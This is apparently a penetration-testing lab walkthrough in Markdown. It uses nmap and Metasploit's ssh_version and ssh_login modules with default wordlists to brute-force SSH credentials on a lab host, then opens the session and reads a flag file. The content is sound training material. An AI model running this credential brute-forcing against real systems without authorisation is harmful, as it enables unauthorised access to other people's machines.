# SSH Login

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 1162–1201. Examples are lab-specific and need verification.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running an SSH service will be accessible at **demo.ine.local**.

**Objective:** Your task is to run the following auxiliary modules against the target:

- auxiliary/scanner/ssh/ssh_version
- auxiliary/scanner/ssh/ssh_login

The following username and password dictionary will be useful: - /usr/share/metasploit-framework/data/wordlists/common_users.txt - /usr/share/metasploit-framework/data/wordlists/common_passwords.txt

Tools: Nmap , Metasploit Framework

```bash
ping -c 4 demo.ine.local
nmap -sS -sV demo.ine.local

msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS demo.ine.local
exploit

use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit

sessions
sessions -i 1

or
/bin/bash -i
find / -name "flag"
cat /flag

```
